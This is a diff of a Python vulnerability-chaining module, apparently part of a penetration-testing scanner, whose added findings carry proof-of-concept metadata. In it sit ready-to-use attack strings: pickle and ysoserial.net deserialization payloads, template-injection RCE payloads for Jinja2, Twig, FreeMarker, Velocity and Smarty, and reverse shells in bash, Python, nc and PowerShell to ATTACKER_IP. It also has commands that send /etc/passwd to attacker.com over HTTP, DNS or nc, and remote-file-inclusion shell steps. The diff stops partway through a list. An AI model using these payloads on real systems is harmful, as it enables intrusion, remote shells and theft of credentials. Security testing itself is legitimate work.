+                "is_chain": True,
+                "poc": {
+                    "payload_template": "import pickle, os; class RCE: __reduce__ = lambda self: (os.system, ('id',)); pickle.dumps(RCE())",
+                    "steps": [
+                        "1. Identify pickle.loads() with user-controlled input",
+                        "2. Generate malicious pickle: import pickle; exec(open('payload.py').read())",
+                        "3. Base64 encode if transmitted via HTTP",
+                        "4. Inject via vulnerable parameter",
+                        "5. Verify execution via callback or output",
+                    ],
+                },
+            },
         }]
 
     async def _deser_dotnet_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: .NET deserialization → RCE via ysoserial.net."""
+        endpoint = finding.get("matched_at") or context.get("target")
         return [{
             "type": "deser_dotnet_chain",
             "name": ".NET Deserialization → ysoserial.net RCE",
             "severity": "CRITICAL",
-            "confidence": 90,
-            "matched_at": context.get("vulnerable_endpoint"),
-            "metadata": {"chain_type": "dotnet_deser_rce", "poc": {"tool": "ysoserial.net"}},
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-502",
+            "description": ".NET BinaryFormatter/ObjectStateFormatter can be exploited for RCE",
+            "metadata": {
+                "chain_type": "dotnet_deser_rce",
+                "is_chain": True,
+                "poc": {
+                    "tool": "ysoserial.net",
+                    "steps": [
+                        "1. Identify .NET deserialization (ViewState, cookies, API)",
+                        "2. Check formatter: BinaryFormatter, SoapFormatter, ObjectStateFormatter",
+                        "3. Generate payload: ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'whoami'",
+                        "4. Base64 encode and inject",
+                        "5. Verify RCE",
+                    ],
+                    "common_gadgets": ["TypeConfuseDelegate", "WindowsIdentity", "ActivitySurrogateSelector"],
+                },
+            },
         }]
 
     async def _ssti_rce(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: SSTI → Template engine RCE."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        template_engine = context.get("template_engine", "unknown")
         return [{
             "type": "ssti_rce_chain",
-            "name": "SSTI → Template Engine RCE",
+            "name": f"SSTI → {template_engine.title()} Template Engine RCE",
             "severity": "CRITICAL",
-            "confidence": 90,
-            "matched_at": context.get("vulnerable_endpoint"),
-            "metadata": {"chain_type": "ssti_rce"},
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-94",
+            "description": f"Server-Side Template Injection can be escalated to RCE in {template_engine}",
+            "metadata": {
+                "chain_type": "ssti_rce",
+                "template_engine": template_engine,
+                "is_chain": True,
+                "poc": {
+                    "payloads_by_engine": {
+                        "jinja2": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+                        "twig": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+                        "freemarker": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+                        "velocity": "#set($e='')#foreach($c in [1..1])#set($cmd=$e.class.forName('java.lang.Runtime').getRuntime().exec('id'))#end",
+                        "smarty": "{php}system('id');{/php}",
+                    },
+                    "steps": [
+                        "1. Confirm SSTI: {{7*7}} → 49",
+                        "2. Identify template engine via error messages or specific syntax",
+                        "3. Use engine-specific payload for RCE",
+                        "4. Establish persistence or exfiltrate data",
+                    ],
+                },
+            },
         }]
 
     async def _cmdi_reverse_shell_prep(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: Command injection → Reverse shell preparation."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        os_type = context.get("os_type", "linux")
         return [{
             "type": "cmdi_revshell_chain",
             "name": "Command Injection → Reverse Shell Prepared",
             "severity": "CRITICAL",
-            "confidence": 90,
-            "matched_at": context.get("vulnerable_endpoint"),
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-78",
+            "description": "Confirmed command injection can be escalated to full system access via reverse shell",
             "metadata": {
                 "chain_type": "cmdi_revshell",
+                "os_type": os_type,
+                "is_chain": True,
                 "poc": {
                     "bash_revshell": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
-                    "python_revshell": "python -c 'import socket,subprocess,os;...'",
+                    "python_revshell": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+                    "nc_revshell": "nc -e /bin/sh ATTACKER_IP 4444",
+                    "powershell_revshell": "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);...",
+                    "steps": [
+                        "1. Start listener: nc -lvnp 4444",
+                        "2. Identify working command separator: ; | || && %0a",
+                        "3. Test connectivity: curl/wget to your server",
+                        "4. Send reverse shell payload",
+                        "5. Upgrade shell: python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+                    ],
                 },
             },
         }]
 
     async def _cmdi_data_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: Command injection → Data exfiltration."""
+        endpoint = finding.get("matched_at") or context.get("target")
         return [{
             "type": "cmdi_exfil_chain",
             "name": "Command Injection → Data Exfiltration",
             "severity": "HIGH",
-            "confidence": 85,
-            "matched_at": context.get("vulnerable_endpoint"),
-            "metadata": {"chain_type": "cmdi_exfil"},
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-78",
+            "description": "Command injection enables exfiltration of sensitive data including credentials and configs",
+            "metadata": {
+                "chain_type": "cmdi_exfil",
+                "is_chain": True,
+                "poc": {
+                    "exfil_targets": get_sensitive_paths("linux"),
+                    "exfil_methods": {
+                        "curl": "curl -X POST -d @/etc/passwd https://attacker.com/exfil",
+                        "wget": "wget --post-file=/etc/passwd https://attacker.com/exfil",
+                        "dns": "cat /etc/passwd | base64 | while read line; do nslookup $line.attacker.com; done",
+                        "nc": "cat /etc/passwd | nc attacker.com 4444",
+                    },
+                    "steps": [
+                        "1. Enumerate readable files: ls -la /etc/ /var/www/",
+                        "2. Target high-value: .env, config.php, id_rsa, passwd/shadow",
+                        "3. Exfil via HTTP/DNS/raw socket",
+                        "4. Decode and analyze",
+                    ],
+                },
+            },
         }]
 
     async def _redirect_oauth_theft(self, finding: Dict, context: Dict) -> List[Dict]:
@@ -2635,7 +3960,7 @@ fetch('https://vulnerable-api.com/user/data', {
                     "is_cross_module": False,
                     "poc": {
                         "xss_payload": xss_payload,
-                        "manual_check": "Verify if tokens are in localStorage or cookies without HttpOnly",
+                        "auto_check": "HttpOnly verified via Set-Cookie header analysis in XSSProver",
                     },
                 },
             })
@@ -3163,6 +4488,639 @@ fetch('https://vulnerable-api.com/user/data', {
         }]
 
     # ════════════════════════════════════════════════════════════════════════
+    # ORPHAN TRIGGER HANDLERS (previously missing)
+    # ════════════════════════════════════════════════════════════════════════
+
+    async def _path_traversal_config_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L2 FIX: Path traversal → Extract configuration files."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        os_type = context.get("os_type", "linux")
+        paths = get_sensitive_paths(os_type)
+        return [{
+            "type": "chain_finding",
+            "name": "Path Traversal → Configuration Extraction",
+            "severity": "HIGH",
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-22",
+            "description": "Path traversal can be used to extract application configuration files containing credentials",
+            "metadata": {
+                "chain_type": "path_traversal_config",
+                "is_chain": True,
+                "targets": paths.get("web_config", []) + paths.get("db_config", []),
+                "poc": {
+                    "steps": [
+                        "1. Confirm traversal: ../../../etc/passwd",
+                        "2. Target web config: ../../../var/www/.env",
+                        "3. Target DB config: ../../../etc/mysql/my.cnf",
+                        "4. Extract and analyze credentials",
+                    ],
+                },
+            },
+        }]
+
+    async def _path_traversal_source_code(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L2 FIX: Path traversal → Read application source code."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        return [{
+            "type": "chain_finding",
+            "name": "Path Traversal → Source Code Disclosure",
+            "severity": "MEDIUM",
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-22",
+            "description": "Path traversal can expose application source code, revealing logic and secrets",
+            "metadata": {
+                "chain_type": "path_traversal_source",
+                "is_chain": True,
+                "poc": {
+                    "steps": [
+                        "1. Identify web root location",
+                        "2. Read main application files",
+                        "3. Search for hardcoded credentials",
+                        "4. Analyze business logic for vulnerabilities",
+                    ],
+                },
+            },
+        }]
+
+    async def _weak_crypto_token_forge(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L2 FIX: Weak cryptography → Forge tokens or decrypt data."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        crypto_weakness = context.get("crypto_weakness", "unknown")
+        return [{
+            "type": "chain_finding",
+            "name": "Weak Cryptography → Token Forgery",
+            "severity": "HIGH",
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-327",
+            "description": f"Weak cryptographic implementation ({crypto_weakness}) may allow token forgery or data decryption",
+            "metadata": {
+                "chain_type": "weak_crypto_forge",
+                "crypto_weakness": crypto_weakness,
+                "is_chain": True,
+                "poc": {
+                    "weak_algorithms": ["MD5", "SHA1", "DES", "RC4", "ECB mode"],
+                    "steps": [
+                        "1. Identify cryptographic weakness",
+                        "2. For weak hashing: attempt rainbow table lookup",
+                        "3. For weak encryption: attempt known-plaintext attack",
+                        "4. For predictable tokens: analyze pattern and forge",
+                    ],
+                },
+            },
+        }]
+
+    async def _session_fixation_ato(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L2 FIX: Session fixation → Account takeover."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        return [{
+            "type": "chain_finding",
+            "name": "Session Fixation → Account Takeover",
+            "severity": "HIGH",
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-384",
+            "description": "Session fixation vulnerability enables account takeover via forced session ID",
+            "metadata": {
+                "chain_type": "session_fixation_ato",
+                "is_chain": True,
+                "poc": {
+                    "steps": [
+                        "1. Get valid session ID from target site",
+                        "2. Craft phishing link with session ID in URL/cookie",
+                        "3. Victim clicks link and authenticates",
+                        "4. Attacker uses same session ID to access victim's account",
+                    ],
+                    "attack_vectors": ["URL parameter", "Cookie via XSS", "Meta refresh"],
+                },
+            },
+        }]
+
+    async def _rfi_remote_shell(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L2 FIX: RFI → Include remote webshell for RCE."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        return [{
+            "type": "chain_finding",
+            "name": "RFI → Remote Code Execution",
+            "severity": "CRITICAL",
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-98",
+            "description": "Remote File Inclusion can load attacker-controlled code for RCE",
+            "metadata": {
+                "chain_type": "rfi_rce",
+                "is_chain": True,
+                "poc": {
+                    "steps": [
+                        "1. Host malicious PHP/script on attacker server",
+                        "2. Include via: ?file=http://attacker.com/shell.php",
+                        "3. If blocked, try: ?file=http://attacker.com/shell.txt (with PHP code)",
+                        "4. Bypass filters: //attacker.com, \\\\attacker.com, data://",
+                    ],
+                },
+            },
+        }]
+
+    async def _rfi_data_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L2 FIX: RFI → Exfiltrate data to attacker server."""
+        endpoint = finding.get("matched_at") or context.get("target")
+        return [{
+            "type": "chain_finding",
+            "name": "RFI → Data Exfiltration",
+            "severity": "HIGH",
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-98",
+            "description": "RFI can be used to exfiltrate data to attacker-controlled server",
+            "metadata": {"chain_type": "rfi_exfiltration"},
+        }]
+
+    async def _sqli_blind_data_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Blind SQLi → Boolean/time-based data extraction."""
+        return [{
+            "type": "chain_finding",
+            "name": "Blind SQLi → Data Extraction",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": finding.get("matched_at", ""),
+            "description": "Blind SQL injection can extract data via boolean/time-based inference",
+            "metadata": {"chain_type": "sqli_blind_extraction", "db_type": context.get("db_type", "unknown")},
+        }]
+
+    async def _sqli_blind_file_read(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Blind SQLi → Conditional file read."""
+        return [{
+            "type": "chain_finding",
+            "name": "Blind SQLi → File Read",
+            "severity": "MEDIUM",
+            "confidence": 70,
+            "matched_at": finding.get("matched_at", ""),
+            "description": "Blind SQLi can infer file contents through conditional responses",
+            "metadata": {"chain_type": "sqli_blind_file"},
+        }]
+
+    async def _s3_data_enumeration(self, finding: Dict, context: Dict) -> List[Dict]:
+        """S3 misconfiguration → List and download bucket contents."""
+        return [{
+            "type": "chain_finding",
+            "name": "S3 Misconfiguration → Data Enumeration",
+            "severity": "HIGH",
+            "confidence": 90,
+            "matched_at": finding.get("matched_at", ""),
+            "description": "Misconfigured S3 bucket allows listing and downloading contents",
+            "metadata": {"chain_type": "s3_enumeration"},
+        }]
+
+    async def _s3_write_check(self, finding: Dict, context: Dict) -> List[Dict]:
+        """S3 misconfiguration → Check for write access."""
+        return [{
+            "type": "chain_finding",
+            "name": "S3 Misconfiguration → Write Access Check",
+            "severity": "CRITICAL",
+            "confidence": 75,
+            "matched_at": finding.get("matched_at", ""),
+            "description": "Checking if S3 bucket allows write access (could enable supply chain attack)",
+            "metadata": {"chain_type": "s3_write"},
+        }]
+
+    # ════════════════════════════════════════════════════════════════════════
+    # H2 FIX 2026-02-12: ORPHAN TRIGGER HANDLERS
+    # ════════════════════════════════════════════════════════════════════════
+
+    async def _csrf_admin_action(self, finding: Dict, context: Dict) -> List[Dict]:
+        """CSRF → Admin state change (password reset, role change)."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "csrf_admin_chain",
+            "name": "CSRF → Admin State Change",
+            "severity": "HIGH",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-352",
+            "description": "CSRF vulnerability can be chained to perform admin actions (role change, settings modification)",
+            "metadata": {
+                "chain_type": "csrf_admin",
+                "poc": {"technique": "Craft form to target admin endpoint, trick admin into visiting"},
+            },
+        }]
+
+    async def _csrf_account_takeover(self, finding: Dict, context: Dict) -> List[Dict]:
+        """CSRF → Account takeover via email/password change."""
+        endpoint = finding.get("matched_at", "")
+
+        # FP3 FIX 2026-02-18: Validate source finding before creating chain
+        # 1. Require valid matched_at endpoint
+        if not endpoint or endpoint == "":
+            logger.debug("[ChainEngine] CSRF→ATO skipped: no matched_at endpoint")
+            return []
+
+        # FP3 FIX: 2. Endpoint must be email/password change related
+        ato_indicators = [
+            '/email', '/password', '/account', '/profile', '/settings',
+            '/user/update', '/user/edit', '/change-email', '/change-password',
+            '/reset', '/modify', '/update-profile', '/preferences',
+            'update_email', 'update_password', 'change_email', 'change_password',
+            '/api/user', '/api/account', '/api/profile', '/me'
+        ]
+        endpoint_lower = endpoint.lower()
+        if not any(ind in endpoint_lower for ind in ato_indicators):
+            logger.debug(f"[ChainEngine] CSRF→ATO skipped: endpoint {endpoint} not ATO-related")
+            return []
+
+        # FP3 FIX: 3. Source finding must have reasonable confidence
+        source_confidence = finding.get("confidence", 0)
+        if isinstance(source_confidence, str):
+            source_confidence = {"CRITICAL": 95, "HIGH": 85, "MEDIUM": 65, "LOW": 40}.get(source_confidence.upper(), 50)
+        if source_confidence < 70:
+            logger.debug(f"[ChainEngine] CSRF→ATO skipped: low source confidence {source_confidence}")
+            return []
+
+        return [{
+            "type": "csrf_ato_chain",
+            "name": "CSRF → Account Takeover",
+            "severity": "CRITICAL",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-352",
+            "description": "CSRF can change user email/password, leading to account takeover",
+            "metadata": {
+                "chain_type": "csrf_ato",
+                "poc": {"steps": [
+                    "1. Identify email/password change endpoint",
+                    "2. Craft CSRF payload to change to attacker-controlled email",
+                    "3. Reset password via email → ATO"
+                ]},
+                "source_validation": {
+                    "endpoint_matched": True,
+                    "source_confidence": source_confidence,
+                },
+            },
+        }]
+
+    async def _smuggling_cache_poison(self, finding: Dict, context: Dict) -> List[Dict]:
+        """HTTP Smuggling → Cache poisoning attack."""
+        endpoint = finding.get("matched_at", "")
+
+        # FP5 FIX 2026-02-18: Check if localhost (no CDN/proxy possible)
+        localhost_indicators = ['localhost', '127.0.0.1', '::1', '0.0.0.0']
+        endpoint_lower = endpoint.lower()
+        if any(ind in endpoint_lower for ind in localhost_indicators):
+            logger.debug(f"[ChainEngine] Smuggling→Cache skipped: localhost target has no CDN")
+            return []
+
+        # FP5 FIX: Check for CDN/proxy indicators in context
+        tech_intel = context.get("tech_intelligence", {})
+        headers_seen = context.get("headers", {})
+
+        cdn_indicators = [
+            'cloudflare', 'akamai', 'fastly', 'cloudfront', 'varnish',
+            'nginx', 'apache', 'haproxy', 'traefik', 'envoy', 'squid',
+            'cdn', 'cache', 'proxy'
+        ]
+
+        # Check for CDN presence
+        has_cdn = (
+            tech_intel.get("cdn_detected") or
+            tech_intel.get("proxy_detected") or
+            any(cdn in str(headers_seen).lower() for cdn in cdn_indicators) or
+            'via' in str(headers_seen).lower() or
+            'x-cache' in str(headers_seen).lower() or
+            'cf-ray' in str(headers_seen).lower() or
+            'x-served-by' in str(headers_seen).lower() or
+            'x-cdn' in str(headers_seen).lower()
+        )
+
+        if not has_cdn:
+            # No CDN/proxy detected - chain less likely
+            # Downgrade instead of skip (smuggling itself is still valid finding)
+            logger.debug(f"[ChainEngine] Smuggling→Cache: no CDN detected, downgrading chain")
+            return [{
+                "type": "smuggling_cache_chain",
+                "name": "HTTP Smuggling (No Cache Detected)",
+                "severity": "HIGH",  # Downgraded from CRITICAL
+                "confidence": 60,  # Lower confidence
+                "matched_at": endpoint,
+                "url": endpoint,
+                "cwe": "CWE-444",
+                "description": "HTTP smuggling detected but no caching proxy found. Cache poisoning impact reduced.",
+                "metadata": {
+                    "chain_type": "smuggling_cache",
+                    "impact": "Direct request manipulation (no cache to poison)",
+                    "cdn_detected": False,
+                    "note": "FP5 FIX: Downgraded - no CDN/proxy indicators found",
+                },
+            }]
+
+        return [{
+            "type": "smuggling_cache_chain",
+            "name": "HTTP Smuggling → Cache Poisoning",
+            "severity": "CRITICAL",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-444",
+            "description": "HTTP request smuggling can poison CDN/proxy cache with malicious content",
+            "metadata": {
+                "chain_type": "smuggling_cache",
+                "impact": "Serve malicious content to all users hitting cached endpoint",
+                "cdn_detected": True,
+            },
+        }]
+
+    async def _smuggling_request_hijack(self, finding: Dict, context: Dict) -> List[Dict]:
+        """HTTP Smuggling → Request hijacking/credential theft."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "smuggling_hijack_chain",
+            "name": "HTTP Smuggling → Request Hijacking",
+            "severity": "HIGH",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-444",
+            "description": "HTTP smuggling can hijack other users' requests, steal credentials",
+            "metadata": {"chain_type": "smuggling_hijack"},
+        }]
+
+    async def _container_escape(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Container Exposure → Container escape to host."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "container_escape_chain",
+            "name": "Container Exposure → Host Escape",
+            "severity": "CRITICAL",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-250",
+            "description": "Container misconfiguration enables escape to host system",
+            "metadata": {
+                "chain_type": "container_escape",
+                "poc": {"techniques": ["privileged mode", "docker.sock mount", "kernel exploits"]},
+            },
+        }]
+
+    async def _container_secret_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Container Exposure → Extract secrets from environment."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "container_secrets_chain",
+            "name": "Container Exposure → Secret Extraction",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-200",
+            "description": "Container exposure allows extraction of secrets from environment variables and mounted volumes",
+            "metadata": {"chain_type": "container_secrets"},
+        }]
+
+    async def _upload_webshell(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Unrestricted File Upload → Web shell RCE."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "upload_webshell_chain",
+            "name": "File Upload → Web Shell RCE",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-434",
+            "description": "Unrestricted file upload allows uploading web shell for remote code execution",
+            "metadata": {
+                "chain_type": "upload_webshell",
+                "poc": {"extensions": [".php", ".jsp", ".aspx", ".phtml", ".php5"]},
+            },
+        }]
+
+    async def _upload_xss(self, finding: Dict, context: Dict) -> List[Dict]:
+        """File Upload → Stored XSS via uploaded content."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "upload_xss_chain",
+            "name": "File Upload → Stored XSS",
+            "severity": "HIGH",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-79",
+            "description": "File upload can be exploited for stored XSS via SVG, HTML, or malicious image metadata",
+            "metadata": {"chain_type": "upload_xss"},
+        }]
+
+    async def _git_credential_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Git Exposure → Extract credentials from .git history."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "git_creds_chain",
+            "name": "Git Exposure → Credential Extraction",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-200",
+            "description": "Exposed .git directory allows extraction of credentials from commit history",
+            "metadata": {
+                "chain_type": "git_creds",
+                "poc": {"steps": [
+                    "1. Download .git directory recursively",
+                    "2. git log --all --full-history -- '*.env' '*.conf'",
+                    "3. git show <commit>:<file> for deleted secrets"
+                ]},
+            },
+        }]
+
+    async def _git_source_analysis(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Git Exposure → Analyze source for vulnerabilities."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "git_source_chain",
+            "name": "Git Exposure → Source Code Analysis",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-200",
+            "description": "Full source code access enables deep vulnerability analysis",
+            "metadata": {"chain_type": "git_source"},
+        }]
+
+    async def _cicd_pipeline_injection(self, finding: Dict, context: Dict) -> List[Dict]:
+        """CI/CD Exposure → Pipeline injection for RCE."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "cicd_injection_chain",
+            "name": "CI/CD Exposure → Pipeline Injection RCE",
+            "severity": "CRITICAL",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-94",
+            "description": "CI/CD misconfiguration allows injecting malicious code into build pipeline",
+            "metadata": {
+                "chain_type": "cicd_injection",
+                "impact": "Supply chain attack affecting all downstream users",
+            },
+        }]
+
+    async def _cicd_secret_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
+        """CI/CD Exposure → Extract secrets from pipeline config."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "cicd_secrets_chain",
+            "name": "CI/CD Exposure → Secret Extraction",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-200",
+            "description": "CI/CD configuration exposes secrets (API keys, deployment credentials)",
+            "metadata": {"chain_type": "cicd_secrets"},
+        }]
+
+    async def _takeover_cookie_theft(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Subdomain Takeover → Steal cookies via scope overlap."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "takeover_cookies_chain",
+            "name": "Subdomain Takeover → Cookie Theft",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-384",
+            "description": "Subdomain takeover allows stealing cookies scoped to parent domain",
+            "metadata": {
+                "chain_type": "takeover_cookies",
+                "poc": {"technique": "Set cookie with Domain=.example.com from sub.example.com"},
+            },
+        }]
+
+    async def _takeover_phishing(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Subdomain Takeover → Phishing on trusted domain."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "takeover_phishing_chain",
+            "name": "Subdomain Takeover → Phishing",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-601",
+            "description": "Subdomain takeover enables phishing on trusted company domain",
+            "metadata": {"chain_type": "takeover_phishing"},
+        }]
+
+    async def _pp_xss_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Prototype Pollution → XSS via polluted properties."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "pp_xss_chain",
+            "name": "Prototype Pollution → XSS",
+            "severity": "HIGH",
+            "confidence": 75,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-1321",
+            "description": "Prototype pollution can be escalated to XSS via polluted object properties used in DOM",
+            "metadata": {"chain_type": "pp_xss"},
+        }]
+
+    async def _pp_auth_bypass(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Prototype Pollution → Authentication bypass."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "pp_auth_chain",
+            "name": "Prototype Pollution → Auth Bypass",
+            "severity": "CRITICAL",
+            "confidence": 70,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-1321",
+            "description": "Prototype pollution can bypass authentication by polluting isAdmin/role properties",
+            "metadata": {"chain_type": "pp_auth"},
+        }]
+
+    async def _ws_session_hijack(self, finding: Dict, context: Dict) -> List[Dict]:
+        """WebSocket Hijack → Session hijacking."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "ws_hijack_chain",
+            "name": "WebSocket Hijack → Session Hijacking",
+            "severity": "HIGH",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-1385",
+            "description": "WebSocket hijacking enables stealing session tokens and impersonating users",
+            "metadata": {"chain_type": "ws_session"},
+        }]
+
+    async def _ws_data_injection(self, finding: Dict, context: Dict) -> List[Dict]:
+        """WebSocket Hijack → Inject malicious data."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "ws_injection_chain",
+            "name": "WebSocket Hijack → Data Injection",
+            "severity": "HIGH",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-94",
+            "description": "WebSocket hijacking allows injecting malicious commands/data into websocket stream",
+            "metadata": {"chain_type": "ws_injection"},
+        }]
+
+    async def _oracle_token_forge(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Padding Oracle → Forge authentication tokens."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "oracle_forge_chain",
+            "name": "Padding Oracle → Token Forgery",
+            "severity": "CRITICAL",
+            "confidence": 75,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-354",
+            "description": "Padding oracle vulnerability enables forging authentication tokens",
+            "metadata": {
+                "chain_type": "oracle_forge",
+                "poc": {"tool": "padbuster", "technique": "Bit-flip attack on CBC mode"},
+            },
+        }]
+
+    async def _oracle_decrypt(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Padding Oracle → Decrypt sensitive data."""
+        endpoint = finding.get("matched_at", "")
+        return [{
+            "type": "oracle_decrypt_chain",
+            "name": "Padding Oracle → Data Decryption",
+            "severity": "HIGH",
+            "confidence": 70,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "cwe": "CWE-354",
+            "description": "Padding oracle allows byte-by-byte decryption of encrypted data",
+            "metadata": {"chain_type": "oracle_decrypt"},
+        }]
+
+    # ════════════════════════════════════════════════════════════════════════
     # TECHNOLOGY-BASED SPECULATIVE CHAIN GENERATION
     # ════════════════════════════════════════════════════════════════════════
 
@@ -3248,28 +5206,78 @@ fetch('https://vulnerable-api.com/user/data', {
         },
     }
 
+    # M3 FIX 2026-02-12: Complete WEAK_CHAIN_PATTERNS
     # Weak chain combinations that shouldn't be rated HIGH/CRITICAL
     WEAK_CHAIN_PATTERNS: List[Dict[str, Any]] = [
+        # Client-side only chains
         {
             "vulns": {"xss", "crlf"},
             "max_severity": "MEDIUM",
-            "reason": "XSS + CRLF is weak chain without additional impact",
+            "reason": "XSS + CRLF is client-side only without additional impact",
         },
         {
             "vulns": {"xss", "csrf"},
             "conditions": ["same_domain", "no_sensitive_action"],
             "max_severity": "MEDIUM",
-            "reason": "XSS + CSRF needs sensitive action for ATO",
+            "reason": "XSS + CSRF needs sensitive action (password change, transfer) for ATO",
         },
+        {
+            "vulns": {"dom_xss", "open_redirect"},
